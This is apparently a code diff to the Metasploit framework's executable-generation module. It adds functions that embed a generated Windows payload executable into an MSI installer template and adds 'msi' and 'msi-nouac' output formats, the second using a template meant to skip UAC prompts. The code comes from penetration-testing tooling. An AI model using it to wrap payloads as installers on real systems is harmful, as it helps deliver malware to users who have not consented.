@@ -27,7 +27,7 @@ require 'msf/core/exe/segment_injector'
 
   def self.set_template_default(opts, exe = nil, path = nil)
     # If no path specified, use the default one.
-    path ||= File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates")
+    path ||= File.join(Msf::Config.data_directory, "templates")
 
     # If there's no default name, we must blow it up.
     if not exe
@@ -487,6 +487,66 @@ require 'msf/core/exe/segment_injector'
     set_template_default(opts, "template_x64_windows.dll")
     opts[:exe_type] = :dll
     exe_sub_method(code,opts)
+  end
+
+  #
+  #   Wraps an executable inside a Windows
+  #    .msi file for auto execution when run
+  #
+  def self.to_exe_msi(framework, exe, opts={})
+    if opts[:uac]
+      opts[:msi_template] ||= "template_nouac_windows.msi"
+    else
+      opts[:msi_template] ||= "template_windows.msi"
+    end
+    return replace_msi_buffer(exe, opts)
+  end
+
+  def self.replace_msi_buffer(pe, opts)
+    opts[:msi_template_path] ||= File.join(Msf::Config.data_directory, "templates")
+
+    if opts[:msi_template].include?(File::SEPARATOR)
+      template = opts[:msi_template]
+    else
+      template = File.join(opts[:msi_template_path], opts[:msi_template])
+    end
+
+    msi = ''
+    File.open(template, "rb") { |fd|
+      msi = fd.read(fd.stat.size)
+    }
+
+    section_size =	2**(msi[30..31].unpack('s')[0])
+    sector_allocation_table = msi[section_size..section_size*2].unpack('l*')
+
+    buffer_chain = []
+    current_secid = 5	# This is closely coupled with the template provided and ideally
+          # would be calculated from the dir stream?
+
+    until current_secid == -2
+      buffer_chain << current_secid
+      current_secid = sector_allocation_table[current_secid]
+    end
+
+    buffer_size = buffer_chain.length * section_size
+
+    if pe.size > buffer_size
+      raise RuntimeError, "MSI Buffer is not large enough to hold the PE file"
+    end
+
+    pe_block_start = 0
+    pe_block_end = pe_block_start + section_size - 1
+
+    buffer_chain.each do |section|
+      block_start = section_size * (section + 1)
+      block_end = block_start + section_size - 1
+      pe_block = [pe[pe_block_start..pe_block_end]].pack("a#{section_size}")
+      msi[block_start..block_end] = pe_block
+      pe_block_start = pe_block_end + 1
+      pe_block_end += section_size
+    end
+
+    return msi
   end
 
   def self.to_osx_arm_macho(framework, code, opts={})
@@ -1586,6 +1646,25 @@ def self.to_vba(framework,code,opts={})
         when ARCH_X64     then to_winpe_only(framework, code, exeopts, arch)
         end
 
+    when 'msi'
+      case arch
+        when ARCH_X86,nil
+          exe = to_win32pe(framework, code, exeopts)
+        when ARCH_X86_64,ARCH_X64
+          exe = to_win64pe(framework, code, exeopts)
+      end
+      output = Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)
+
+    when 'msi-nouac'
+      case arch
+        when ARCH_X86,nil
+          exe = to_win32pe(framework, code, exeopts)
+        when ARCH_X86_64,ARCH_X64
+          exe = to_win64pe(framework, code, exeopts)
+      end
+      exeopts[:uac] = true
+      output = Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)
+
     when 'elf'
       if (not plat or (plat.index(Msf::Module::Platform::Linux)))
         output = case arch
@@ -1651,7 +1730,7 @@ def self.to_vba(framework,code,opts={})
   def self.to_executable_fmt_formats
     [
       'dll','exe','exe-service','exe-small','exe-only','elf','macho','vba','vba-exe',
-      'vbs','loop-vbs','asp','aspx', 'aspx-exe','war','psh','psh-net'
+      'vbs','loop-vbs','asp','aspx', 'aspx-exe','war','psh','psh-net', 'msi', 'msi-nouac'
     ]
   end
 
